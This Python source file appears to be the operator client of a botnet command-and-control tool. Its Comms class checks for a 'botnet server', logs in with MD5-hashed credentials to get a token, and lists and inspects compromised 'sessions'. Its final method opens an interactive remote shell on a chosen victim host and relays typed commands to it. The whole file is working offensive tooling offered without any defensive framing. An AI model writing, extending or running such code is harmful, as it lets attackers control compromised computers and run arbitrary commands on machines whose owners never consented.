#!/bin/python3

from subprocess import Popen, PIPE
import socket
import hashlib
from datetime import datetime
from json import loads

from modules.colors import Colors

c = Colors()

class Comms:
    def __init__(self, IP, PORT): 
        self.ip = IP
        self.port = PORT

    def is_alive(self) -> bool:
        process = Popen(["ping", "-c1", self.ip], stdout=PIPE, stderr=PIPE) 
        stdout, _ = process.communicate()
        stdout = stdout.decode()

        if "1 packets transmitted" in stdout and "1 received" in stdout:
            return True
    
        return False

    def is_botnet_server(self) -> bool: 
        # GET SERVER INFORMATION? #
    
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
        try:
            client.connect((self.ip, self.port))
    
        except ConnectionRefusedError: 
            return False

        client.send(b"PING")
        response = client.recv(4)
        response = response.decode()

        if response == "PONG":
            return True
        
        else:
            return False


    def get_token(self, USERNAME: str, PASSWORD: str) -> str: 
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
        client.connect((self.ip, self.port))

        user, password = hashlib.md5(USERNAME.encode()), hashlib.md5(PASSWORD.encode())
        user, password = user.hexdigest(), password.hexdigest()

        message = "LOGIN" + user + password

        client.send(message.encode())

        cred_valid = client.recv(2)
        cred_valid = cred_valid.decode()

        if cred_valid == "OK": 
            TOKEN = client.recv(32).decode() 
    
        else:
            TOKEN = "00000000000000000000000000000000" 

        return TOKEN

    def get_sessions(self, TOKEN: str) -> str:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        client.connect((self.ip, self.port))
    
        message = "GSS" + TOKEN
    
        client.send(message.encode())
        response = client.recv(2).decode()

        if response == "NO":
            print("Failed. Token Forgery")
            return ""

        hosts_len = int(client.recv(16).decode())
        hosts = client.recv(hosts_len).decode() 
    
        return hosts

    def get_session_info(self, ADDRESS, PORT, TOKEN) -> dict:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((self.ip, self.port))
        client.send((f"GETINFO{TOKEN}{ADDRESS}:{PORT}").encode())
        status = client.recv(2).decode()

        if status != "OK":
            print("Refused, invalid token.")
            return {} 

        size = int(client.recv(3).decode())
        raw_info = client.recv(size).decode()
        session_info = loads(raw_info)
        return session_info

    def connect_session(self, ADDRESS: str, PORT: int, TOKEN: str) -> None:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((self.ip, self.port))
        client.send((f"CONNECT{TOKEN}{ADDRESS}:{PORT}").encode())
        status = client.recv(2).decode()

        if status != "OK":
            print("Login Failed.")
            return None
    
        print("Server connecting to the shell...")
        _ = client.recv(4) # wait_sig

        logged_in = client.recv(2).decode()

        if logged_in != "OK":
            print("Failed to connect on shell.")
            return None

        now = datetime.now()
        clock = now.strftime("%H:%M:%S")

        print(f"\n** ({clock}) Connected on {c.blue}{ADDRESS}:{PORT}{c.reset} **\n")

        while True:
            command = input(f"{c.ok}(shell / {ADDRESS}){c.reset} > ").strip()
        
            if command == "exit": 
                client.send(b"EXIT")
                break

            client.send(command.encode())
        
            response = client.recv(1024)
            print(response.decode().strip())
    
        client.shutdown(socket.SHUT_RD)
        client.close()
